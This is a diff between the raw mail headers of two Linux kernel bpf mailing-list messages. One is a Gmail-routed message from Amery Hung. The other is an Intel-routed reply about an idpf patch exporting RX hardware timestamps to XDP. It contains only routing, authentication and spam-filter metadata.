@@ -1,702 +1,324 @@
-Return-Path: <bpf+bounces-75795-lists+bpf=lfdr.de@vger.kernel.org>
+Return-Path: <bpf+bounces-75796-lists+bpf=lfdr.de@vger.kernel.org>
 X-Original-To: lists+bpf@lfdr.de
 Delivered-To: lists+bpf@lfdr.de
-Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [IPv6:2605:f480:58:1:0:1994:3:14])
-	by mail.lfdr.de (Postfix) with ESMTPS id E821CC95F0F
-	for <lists+bpf@lfdr.de>; Mon, 01 Dec 2025 08:03:30 +0100 (CET)
+Received: from ams.mirrors.kernel.org (ams.mirrors.kernel.org [IPv6:2a01:60a::1994:3:14])
+	by mail.lfdr.de (Postfix) with ESMTPS id BA01DC96009
+	for <lists+bpf@lfdr.de>; Mon, 01 Dec 2025 08:29:57 +0100 (CET)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id 254134E1436
-	for <lists+bpf@lfdr.de>; Mon,  1 Dec 2025 07:03:27 +0000 (UTC)
+	by ams.mirrors.kernel.org (Postfix) with ESMTPS id 2A9263423C3
+	for <lists+bpf@lfdr.de>; Mon,  1 Dec 2025 07:29:56 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id C941C2882A8;
-	Mon,  1 Dec 2025 07:03:22 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 493232BE04D;
+	Mon,  1 Dec 2025 07:29:47 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HpOjutv/"
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="FNCWnmtN"
 X-Original-To: bpf@vger.kernel.org
-Received: from mail-yw1-f182.google.com (mail-yw1-f182.google.com [209.85.128.182])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.8])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E51C4285C98
-	for <bpf@vger.kernel.org>; Mon,  1 Dec 2025 07:03:19 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.182
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1764572602; cv=none; b=FGPCVuKNo+dW+LbyBBaWmizmcr/NmDlkH47RrjhexjuecCoRKvQBxqL+AmyAd+53Cae7Gt150gExkrmWxk+b5x3SwuQvFl0OawFCY7Jvpw3L6kFlfhqL/XiY+EPRQBaeJ9sWNnoJbEjB437ioFUAUjqnXaMfpK6meSU8Fo+jhdE=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1764572602; c=relaxed/simple;
-	bh=iRknDmzLlvqYWV+PFdJDA6fj3TCqAWTB7eT+7qGajYg=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=q6Xb+jFQZ9dTFASdSwjU8+Ujt2eUkIP5CyeZ+27jVgno3skjKDPh7b2XgbBDWIiskday1A4q5YjUeMQupcTg+l77XT9a+alovZrrUmoPfc6OmQbm448JLDsFXT+uWhyNZBG8w56EsH2zuFLp7gQ9Q/UCw8PDVeFxQKMRz1LAHZA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HpOjutv/; arc=none smtp.client-ip=209.85.128.182
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
-Received: by mail-yw1-f182.google.com with SMTP id 00721157ae682-786635a8ce4so26550427b3.2
-        for <bpf@vger.kernel.org>; Sun, 30 Nov 2025 23:03:19 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1764572599; x=1765177399; darn=vger.kernel.org;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=8QwtnfQHmF7gx2gV89ngdpRssrFbFSLRulW2+PDqFR4=;
-        b=HpOjutv/BtVzlT4FGGSIswZU9je2IEaJVeS+JdZG+grKEpknKuhWrb7ahpVn0OGETa
-         +UnA72ECwa5ePrOYow5j8fj27GShbtpDobOK2bCx2mbh42r+/0K4+uhtbo/ZhZDSp5sA
-         3BlDm6nt+lNxDETKkTdoXMYo2ivnVVKISnMh5irfdWfhjger5hsub1enUJc29nb18iIZ
-         O7PudocyRQa5fGg6GlWvj67M97EuUpq1Vn8SlceftazfgxEN2WMACVAGEVuHbhXxX3ep
-         w7tJ2vG/nDg0L5ESO1WYWl1Or5xEtBJaEkEsf80b2LdSRi0gocqwBI5ohB5teT3ouiFJ
-         5YvA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1764572599; x=1765177399;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=8QwtnfQHmF7gx2gV89ngdpRssrFbFSLRulW2+PDqFR4=;
-        b=Bqfpybmi9rcfhSI2GSEjZnrsFIAvrMlnxu0tQwfYiBMOC9G0T2XCvm6gfiehkmcXtS
-         VWC73XzTWUPw/7G8oQ+4K+1WoH0xQTL3oQNZJl9Hra0JMkYdgC8F8NUwaK4ES8vU41Zc
-         jvHMPC22YlpnvOGZHQ7T5RYIUyPe/N0egDE97Mlj2BQIb2Zc+od2zqZAxGLY8D+F+3S2
-         JxT8XKuIpthz67gzTpH9PrG1EGTBL6H+6mqmS2miA8Kfssh3cTpg9ctwPl0QQ/y6pmKE
-         CboxtHzKqHYInLWTYZX16EKDicxm7MSr2KEFGTkjm+5wKU4BjdGplqWRZqNquR1Mnmca
-         1ngg==
-X-Forwarded-Encrypted: i=1; AJvYcCXpbKRj3yb80E66KHsWZbwLYzcYWYGtUGo0LmdpkQzZoW4NHl4LytXjpd+CENUGwnRw2ZI=@vger.kernel.org
-X-Gm-Message-State: AOJu0YwriDzOTNKZkDsGk/3QORJuIpJtW+Zty/ytTqmmOpOWWwraSL5h
-	b4yuqQsTBoBsy8gBWMo/5QLrwuEqeZ4veDGTwRotTKspsbB/+hSnT0SQgcPbPpRkCnVbLfbbIXu
-	+d92ncqA7IghlX8A/8eFTlQpV2Au7FKG4iCuB
-X-Gm-Gg: ASbGnctSjipXZ2lYleO1Nyil1u7DEcPosRTBKGZjZtWE6NwdSEjiu5YyaLDWDfDM6Iz
-	7iy1IJBbOqtLSjUqQAD2chGCspaIzXfL/ZYNrhgBKa1blY+isPOm55nmGnN61tIzee/u4jh++Gw
-	1rVz66tGL233ZaYmdm2TRvIvnIlvgTzraGXdTkeE6xCV6dwfMhG9QSHnu14nC36PJ7RtF6PkUbk
-	tUm3weh3divZWazJ84oLhyHUP94iSeYEUA2WvN5Z1W4K0gH1HvDuNaqpqFliXj75JRJcQM=
-X-Google-Smtp-Source: AGHT+IFBsP94j9uZerH3j2fLmhZLSNH+11rieuZtJK1UgVieYDke9uUFvAEhXScNk6kTRUL2Rkafpr4oC+kMmGlNI+w=
-X-Received: by 2002:a05:690c:4b05:b0:787:1aba:30b4 with SMTP id
- 00721157ae682-78a8b555c0dmr331441917b3.54.1764572598557; Sun, 30 Nov 2025
- 23:03:18 -0800 (PST)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9353E2147F9;
+	Mon,  1 Dec 2025 07:29:44 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=192.198.163.8
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1764574186; cv=fail; b=JEGuy4VudytRSww2b/6vHHDYMjA2ff+H/NDLmRNBAdFXNS456PxDKE6IjsOZ2ZW7A1MbyP7Ga2pOHBzAyVGKSJguwTZn9MPJsMl9J9TmY36YU6lqqo23q0IhBHWgtH3aPZqLycqBghK7EIxvCzeueOZPXLJiiwxD+3/Xqc5rKPE=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1764574186; c=relaxed/simple;
+	bh=NvGnT1x0c2YNgsnylZFLedcFB1ozXB51lGwUE7BlEnI=;
+	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
+	 Content-Type:MIME-Version; b=IoJs1aDAJQWEssPuRHIx146SMlSB0967Xe8WcbG46CJ1o71X3eeBWuJ6lS4sBhK0FeK0QncgWKrrpcx9yJ9AthrBa3VSd8Tk6gE1QPwEBlwto9TaSVxYpOYMcRV1Vpu7LC0xWZqNSVvq1HNIHHMlnJSGNu349RNWxe/RQDn91Ho=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=FNCWnmtN; arc=fail smtp.client-ip=192.198.163.8
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1764574184; x=1796110184;
+  h=from:to:cc:subject:date:message-id:references:
+   in-reply-to:content-transfer-encoding:mime-version;
+  bh=NvGnT1x0c2YNgsnylZFLedcFB1ozXB51lGwUE7BlEnI=;
+  b=FNCWnmtNR9Pzvw926obL61hT5EyUyzGVvdssmBla/EkRFXNHgAi4MO5k
+   6USZIGDFQAbWuRlV1fQlYwYIktio3DsZvZVlpRFW7VcLdqIE9ycsWshur
+   FzYG2cYl7iyrDxz0iVX57mvngSfKbRZ7ERvuBrNV+bCtxz+JzBvrsMrwL
+   5K/SeDQ7AHWYWhKYbmoQVaXk3HWGLm+VlVmXJJqRFo9rYEqE+R8dM5kZE
+   3kv3eKLsO0jWyQAv0aUlWM99xluLnSHl8TFtLLbFnrs2H4HnQAYAGiC/x
+   IOgX636X9gmJ+0iR8j9Or7rGwte8T1dCe3TWMjFc5dKGzO2h/5qYaxJRG
+   A==;
+X-CSE-ConnectionGUID: ioT80hfcQvqYq7EZ+bnSFw==
+X-CSE-MsgGUID: 8Go0fTrhQ7mJ4UMVPbcz2Q==
+X-IronPort-AV: E=McAfee;i="6800,10657,11629"; a="84109556"
+X-IronPort-AV: E=Sophos;i="6.20,240,1758610800"; 
+   d="scan'208";a="84109556"
+Received: from orviesa008.jf.intel.com ([10.64.159.148])
+  by fmvoesa102.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 30 Nov 2025 23:29:44 -0800
+X-CSE-ConnectionGUID: ixQ4dt7yQPu3geH2MfrEEQ==
+X-CSE-MsgGUID: iEivMNuOQtuTIQZJ3g7qXg==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.20,240,1758610800"; 
+   d="scan'208";a="194099311"
+Received: from orsmsx901.amr.corp.intel.com ([10.22.229.23])
+  by orviesa008.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 30 Nov 2025 23:29:44 -0800
+Received: from ORSMSX901.amr.corp.intel.com (10.22.229.23) by
+ ORSMSX901.amr.corp.intel.com (10.22.229.23) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.2562.29; Sun, 30 Nov 2025 23:29:42 -0800
+Received: from ORSEDG902.ED.cps.intel.com (10.7.248.12) by
+ ORSMSX901.amr.corp.intel.com (10.22.229.23) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.2562.29 via Frontend Transport; Sun, 30 Nov 2025 23:29:42 -0800
+Received: from CO1PR03CU002.outbound.protection.outlook.com (52.101.46.69) by
+ edgegateway.intel.com (134.134.137.112) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.2562.29; Sun, 30 Nov 2025 23:29:42 -0800
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=UevHS32vvRPMHcnq/BrbyKswtnbZ6EvZFV11f1qNX7h/Y9gTpv9xyZ6iI7i6W+Up0RMq3oDVNqS0e0l5wmOLgoyfsQu9xt+KadcHkldVqQnrZWUaCaUpwj2AKHthEWJUO+e5KIl2UJwbLJ4Fk3kFZnACAmZsXuDiNo93O8ORFHp/CP4BBRIk3J070LgZiUyNDSTqWDiReOUJkmYEz8jzV5cFv8bKqXxkin+b/iQju2VzwSQxv0z93VFmht8cHFZMs5qOaPZxUTLKLbCM0sRPpqy9VL9T6x3JkxpGumxPtkXemALlUesTDqwIVM+CiUM8oRlzkhPHyjDorUdmIU5ebw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=NvGnT1x0c2YNgsnylZFLedcFB1ozXB51lGwUE7BlEnI=;
+ b=rGABN2y/T9Fc7bD/1cx3AQtvKz/5QfAqYH17aTNnhDwGDpy+A6wZKr5ZGojCZVqlHNijEGhoDUVxb21iYCDW3ZjAN5PlBP2fcBuNobnSF6DG+F93OT271FnF4eGGbmk8k4Qkn5ZdxSzZr8LNyDuYvCewtBn0vhD51ybCl1b5k21exfGX6oVdR7jnZ98b8UbhlB+tsDmX9KryMEVyoKz482prlKDiDlvW4ZouQ8g3WRGrb3SCi3ekrv6mxxoNCDvBUh7m5314zUq1TlsQTLdv5rmY2mC9fJS1a4gpz7FKFjSGJYEVN+39eDvD6N7xUfIe+JCjUjdgJlaSKh0cMFgU2w==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
+ dkim=pass header.d=intel.com; arc=none
+Received: from IA3PR11MB8986.namprd11.prod.outlook.com (2603:10b6:208:577::21)
+ by SJ0PR11MB4862.namprd11.prod.outlook.com (2603:10b6:a03:2de::16) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9366.17; Mon, 1 Dec
+ 2025 07:29:40 +0000
+Received: from IA3PR11MB8986.namprd11.prod.outlook.com
+ ([fe80::395e:7a7f:e74c:5408]) by IA3PR11MB8986.namprd11.prod.outlook.com
+ ([fe80::395e:7a7f:e74c:5408%3]) with mapi id 15.20.9366.012; Mon, 1 Dec 2025
+ 07:29:39 +0000
+From: "Loktionov, Aleksandr" <aleksandr.loktionov@intel.com>
+To: Mina Almasry <almasrymina@google.com>
+CC: "netdev@vger.kernel.org" <netdev@vger.kernel.org>, "bpf@vger.kernel.org"
+	<bpf@vger.kernel.org>, "linux-kernel@vger.kernel.org"
+	<linux-kernel@vger.kernel.org>, YiFei Zhu <zhuyifei@google.com>, "Alexei
+ Starovoitov" <ast@kernel.org>, Daniel Borkmann <daniel@iogearbox.net>, "David
+ S. Miller" <davem@davemloft.net>, Jakub Kicinski <kuba@kernel.org>, "Jesper
+ Dangaard Brouer" <hawk@kernel.org>, John Fastabend
+	<john.fastabend@gmail.com>, Stanislav Fomichev <sdf@fomichev.me>, "Nguyen,
+ Anthony L" <anthony.l.nguyen@intel.com>, "Kitszel, Przemyslaw"
+	<przemyslaw.kitszel@intel.com>, Andrew Lunn <andrew+netdev@lunn.ch>, "Eric
+ Dumazet" <edumazet@google.com>, Paolo Abeni <pabeni@redhat.com>, "Lobakin,
+ Aleksander" <aleksander.lobakin@intel.com>, Richard Cochran
+	<richardcochran@gmail.com>, "intel-wired-lan@lists.osuosl.org"
+	<intel-wired-lan@lists.osuosl.org>
+Subject: RE: [Intel-wired-lan] [PATCH net-next v1] idpf: export RX hardware
+ timestamping information to XDP
+Thread-Topic: [Intel-wired-lan] [PATCH net-next v1] idpf: export RX hardware
+ timestamping information to XDP
+Thread-Index: AQHcW7mOEioV57xnd0yuKi6/nWj2urUBgcBAgAqKGgCAAGS1gA==
+Date: Mon, 1 Dec 2025 07:29:39 +0000
+Message-ID: <IA3PR11MB8986359263651CCAEF537CAFE5DBA@IA3PR11MB8986.namprd11.prod.outlook.com>
+References: <20251122140839.3922015-1-almasrymina@google.com>
+ <DS4PPF7551E6552ECCF95AE9C177DEF07F8E5D0A@DS4PPF7551E6552.namprd11.prod.outlook.com>
+ <CAHS8izOjZxEgBmYEhZanp57ukCYU5i5FdWfx5HO5+Ua2V3Owsg@mail.gmail.com>
+In-Reply-To: <CAHS8izOjZxEgBmYEhZanp57ukCYU5i5FdWfx5HO5+Ua2V3Owsg@mail.gmail.com>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+authentication-results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=intel.com;
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: IA3PR11MB8986:EE_|SJ0PR11MB4862:EE_
+x-ms-office365-filtering-correlation-id: deffbdd4-650a-408b-fdbf-08de30ab6309
+x-ms-exchange-senderadcheck: 1
+x-ms-exchange-antispam-relay: 0
+x-microsoft-antispam: BCL:0;ARA:13230040|7416014|376014|1800799024|366016|38070700021;
+x-microsoft-antispam-message-info: =?utf-8?B?U2I0ZFJ5cXh5L0lub2JFZUl5ckNVdEtvY0VmY05GM2RtNCtkMnBhcUl4UHRr?=
+ =?utf-8?B?OFZaWHIzMTcxVXJwMk93cmVqTzNXU0JLa2prYk54ODRYR1NBOEJYeTJmOFo2?=
+ =?utf-8?B?RHd2aWRDS1JEVlI4dytWTitrVG5uTGZ4U0t6ZDR1YW5yc3NhcEJRY1dBazdl?=
+ =?utf-8?B?bTF2L0tBdzExeXBpS3FFNjJJdWlwNjFIWGRDUm1WVEJHWDEvUENJVjY2eXk3?=
+ =?utf-8?B?RXlmMmVVaFQ0c2c2VEJyVWxISWtTMG1NekEvcG96dUdzN1pGQnh3cmlvK3lv?=
+ =?utf-8?B?dE45ZldjL0x3VGhuODhES2dxNnRoY01oanVzWVMyS0Y1L0pYczJrcFhJNVlr?=
+ =?utf-8?B?Y0hiNzNWR3IzN2RQMGdyZTczSzd2SXhEdkJaR0RZYVowdU1VSmJIaEdXNjdw?=
+ =?utf-8?B?UXBGR2JwUitqb1ZCSFI5cGNDaEZwM0U3K0hPaGpQQ1NjVE9tcTJkSmxjNnNP?=
+ =?utf-8?B?MXZia2lzZHgxQ2ZLU3RHSWNhSDNDRVBNV1RzNk03RXBMVXlVY2JoRHJOaVJQ?=
+ =?utf-8?B?UEtja09lZHh4eFduL1NabEVDNTEvSkgvVEo1R0FlMDVVZGUzUnJ2UkoxckdI?=
+ =?utf-8?B?VEFJSFhOY09pd1ZycmFJK0wycG41dVoxZlN4aHkyS1JRdnlySFpQV1Rqb1Vv?=
+ =?utf-8?B?Y2Y1YmpxNlY4YjBmUGcrU0hkVmRySzBBdFpHcC8yKzM3T3F1VGNNSEpNV3Jj?=
+ =?utf-8?B?bkxtS2FmRGlEWE9rVi9sVUpLRU5Qc0ZjZkdmZUhzVjhWSEFIdEFySVRERjZL?=
+ =?utf-8?B?UlovVUVuMG1OeHZJQUlvNlZuN01NbE9LUUwyWjdrMnpIeEZzaGFMemFLVFd1?=
+ =?utf-8?B?NldURG9jSWpzZTNhbVR6bnkrVjRPOEpzTFRzaXYrYnpGNFI4UEd1Z3A4Z3BZ?=
+ =?utf-8?B?aHdlcGgyUGhaakZXb2pNRWVRTTR5Z1BQVmxMNWF3NmlFYVhtdzJuZXA3NVV0?=
+ =?utf-8?B?clVINHZoTDJBQ1VORWlad3ZnMDdha2lNZU1KUU1NWE92a0Q5VFFMYkJMYnZQ?=
+ =?utf-8?B?UnlYNENaVEQvNkhUL0FTYXY2LzZiaDVNWUNsVERxbEFVdDl6L2N3aG1nUEkx?=
+ =?utf-8?B?d3NrK1kraHVncWJIVTM5WEdtREtKUHJuZkNwRmJwUmtHYkgwaWppUzRTV3Bk?=
+ =?utf-8?B?d2pNbGpmMHRxaUdkRVJuS01GUXdYQU9vdWNaNTVQWnNLclg0bWQwdEtocGpW?=
+ =?utf-8?B?TXFGYy9zU2tQQzQ3NjNseCtPeHJmcVBrNVQxZkU1NGNaKzhJU1E4bWJ3enJW?=
+ =?utf-8?B?U0xCTWx0dGFYN1VRbGZzREhHZ2daWVltVGJTVkV5TC9CLysybFlPRHh4YUpG?=
+ =?utf-8?B?VlI5VWdtMUNLbjZKL0U4NlJnU0RhU05LRW1NQzFQL0tGbHJxUmt3dGRsbkla?=
+ =?utf-8?B?Um54eEdSL0xpTEx0Q1V4b3h6NTUyMjRQNGxTYWtzL2tYT2NmeDBVN2x6TVR3?=
+ =?utf-8?B?OWlFdUsweXJGWTBXUVRRL1NjZDB2KzFRWVBJRG05OFJraFk5S3R0Ryt0UUl1?=
+ =?utf-8?B?T01rQURIbnl3YmNpeTBjR05xcDRVMmgwRDIrYldJWDRvdmNWcm1BcVVpdzk3?=
+ =?utf-8?B?VGJUOHdwVjA3V1l0cnBBY0ZkZ05wbm1tMFZzSUQ1bTNpN0l0cWh1ZXpGaS9O?=
+ =?utf-8?B?ZXBad21lZ3FLbGV1NEY0V21aMnhuWjN4a0k0cjlUWmd2ZUdGcm5KeGMzL0p6?=
+ =?utf-8?B?MDU2WVhUakxlRWE4QnlPUFhjK3dpcTM5a1Z1S2k2ZzZhNUN5SE41Qm1rNi9T?=
+ =?utf-8?B?K2NDRlVuMzFuOXo1SGI4cS9MVVVNQ3hUTTdaR1JxMzQ1dWFTZ2R4WjVyZFpp?=
+ =?utf-8?B?cHlmUUloWVdPNHlXQkY2cXhaL2R3ODZzN2dCTFRCU1VPN2UvUDZsNkkzZTZx?=
+ =?utf-8?B?TExiRlZQYkVEWVVPZzlTcXRlaW1SUVQzYkFwMVlSdmVNc0lHMHdUaTlITGNl?=
+ =?utf-8?B?LzUwdXZhV3BsTU5LbXA2dFBaZmxGQzI1aGIxWW1mODg5R1RCY1ZQUi80d2k4?=
+ =?utf-8?B?TkJmVkQrRVBSUHBON1NEcUYxWVF3ZTBPRHF2Ty95cXc4ODkwL2VSeHVBc3A2?=
+ =?utf-8?Q?nvvGzG?=
+x-forefront-antispam-report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:IA3PR11MB8986.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(7416014)(376014)(1800799024)(366016)(38070700021);DIR:OUT;SFP:1101;
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0: =?utf-8?B?ZUNGMENobmRheW1vRU5CNCs3NWNWaGhwekwyNmJtNjZML0dlVFNJbTF6NFdH?=
+ =?utf-8?B?N2dya0xYRkdNWVAzM0RMMEQyNkJFTGNOYVN5YlVwK0NEQ293TWZsSTZ1UzJu?=
+ =?utf-8?B?YWdHeGhzWG5SZWlwZDJENnAxVHE0cUVxYnB6bGEyT0JVWWhJdEIrdHJkdTBo?=
+ =?utf-8?B?TWN3TENMUmdoZmVKS0x0ckZNWmg4MUk0ZGhKVElSem5rYWJoQUFyMVhMc2VD?=
+ =?utf-8?B?TGViT0NmejV2dkxDRzlrK0dNRVBBZ25nbkpETjNJOExtRjdjcW9xbHI3QVhm?=
+ =?utf-8?B?YVd5TmhyMFlGMWJCNEJpelkxbHRmOGxybytndjR4VUV6V05ycitXU0g3ZjNp?=
+ =?utf-8?B?MzQ1Y0ZUeVdtOWsxUEUwZzV5YlRGTXJTMGVBb3I3TkN3NmZzeFFmeC9obklP?=
+ =?utf-8?B?ZnV0RXk2TTFOaTFSVmd4K0pCUzUzdDJxeE9KYUo3UnlaSVV6d2hOQ2c4Z2hF?=
+ =?utf-8?B?QUNqZWRNRU1JeFlSVThlQlV3TXNvMkwwcHFzYTBYS0tSUk40RU5sM1BhdjBY?=
+ =?utf-8?B?N3hnT1lhNzRieU9UVE9tRnRUcjdoZjNKUi9FcHNqNkZNbWxuVlNvSG9pMm93?=
+ =?utf-8?B?ek05UVdQQTlONTVxdmN6THhyM1o4ZG5HYVYvc090S2dYM1dycUc5cXRleWd6?=
+ =?utf-8?B?OGNFMG1tejdiM0FhK3drOFZKN1REVE9vQThRSC85RVdNcmcrNTRXR28xcWEz?=
+ =?utf-8?B?c2N0VHpPWW4vTjJUdk8wQWZaeVZ6WmpORVVDL2g1bGNqUlBqd2xvOTVmb0Ji?=
+ =?utf-8?B?Rmhrc3FRbUQwQ1hqNkNHTlo2ZkNwNS9rcnRMZnpzMW9xeWVUblFRMGd5VEhZ?=
+ =?utf-8?B?V3BVUkl6OUM4Z2J3aHhmb24rVmVYd1hkZUdtR0lCZjFaL0ROY29OSGw0VWdZ?=
+ =?utf-8?B?aGpsd2h5Vk13dGFSdHNXdzYyWk1rMjRGQVMvdG94YlJ3Uk5jZStwREU0TDMr?=
+ =?utf-8?B?LzlpSmczYi9YYnhyRXcyeHFUZURnb1ZGRGkzNmNKcWRWbml1eGU1dWovd1FD?=
+ =?utf-8?B?R0xhWVFIUnhxN2dON2hmSGdZVFR6THYvY3EweVdGbkljMVhoY3V3dUY4TWhB?=
+ =?utf-8?B?UkdJL0MvK2dOVkw2MTRXbVR3cnRKRnUvUU1EVFNwUnFScEFTQWloRk8xRlVs?=
+ =?utf-8?B?ZUttT1U4Qmx0RlRMNTIyL241TS9WV2dzOTJTYk5KNUdSdVlab0FvdFNNaHhm?=
+ =?utf-8?B?OWVsSmNwY2FjQUxsdkVJQTEzd2NwQmpzdkVhVUgwYy9jeFZZeXFwQWNiOU9D?=
+ =?utf-8?B?SklPTE14dTUyYlhKUFdIY3l1YWJZdzVLOG5qL1lBa21pOVJWREhCV0taSStU?=
+ =?utf-8?B?UjFGNWI3Qlh2bzVQdWRUZ2xWcGREaG82eElxOFNqWjZsOUxsNlJnZTNBQzZ1?=
+ =?utf-8?B?WU1jeGJETlk0RDd3Q0Q5VEZkNEFaR01PVXdjSlpEOXZGK2ZORWpJRzl5L3gx?=
+ =?utf-8?B?UGlOcU5xQ0pqQng2U3BzR0grUFYwZXdURCt1bmFzSDVyNDU2a3hwY0pUdE1G?=
+ =?utf-8?B?eFJ3elI0S1BHVVErNWlyOFNPU1Q2b3FTaVNJWjlkWE9xdHhNVCtVemx4VlZt?=
+ =?utf-8?B?T0cwM0NYR3lZbHVXeGZMMzNNdCtXQldLaVRMS1NuOUpJNkw4Q2ZMaFF4allM?=
+ =?utf-8?B?Z2U1cDhhZWkwL3J5Q1huOVpncHR3T1A1S2Y4ak5mNFh4UDdPNFVGcVlvVmpx?=
+ =?utf-8?B?cVk5MjdsSDUrYlhHMWpPNmUwMEZMeHJJSkRham9ISFM2OHRWMFN1Q0NhYlli?=
+ =?utf-8?B?VFJNZU9zdk9zY2lHc2FVZWdHaDRGZkpmdnA1Y004dk9WM2prd255cC92dlls?=
+ =?utf-8?B?YkIrRjl6Tjl5R0QzcFJPWUhNMVNEQm5rUzVyMG1uTTNLSFJZcjlMb055Wi8y?=
+ =?utf-8?B?MnFLZ01YUzJraWNzVEN6SzBvaW43QWVKd1lkWFlZcEpKRzAwVCtkOHU3Nmoy?=
+ =?utf-8?B?VnpUQm5hbzVvQ1FlV3Q5NlBlYXVnc1krR1NZTnFhcHVNTHROTlpXQ2VwY0FU?=
+ =?utf-8?B?b2xxUkNGQ1FTdkttQUJoUStkaExlRnZOWlRTT2dyWmNxMkwxa1dSTEgybndh?=
+ =?utf-8?B?eWxwall6MnRYZ3ZET1EyVHoyRWJ0cWpHQzVpL0FFUytIN1Rrby9aOXJjSVFw?=
+ =?utf-8?B?WmtKNWV3eGpvZXYxV05nMFN6YzhZRWtyajlSRXdicUN1M2YrcmFpTHYxNDRS?=
+ =?utf-8?B?OWc9PQ==?=
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: base64
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <44f2b634.4a2b9.19ad8756ca3.Coremail.kaiyanm@hust.edu.cn>
-In-Reply-To: <44f2b634.4a2b9.19ad8756ca3.Coremail.kaiyanm@hust.edu.cn>
-From: Amery Hung <ameryhung@gmail.com>
-Date: Sun, 30 Nov 2025 23:03:07 -0800
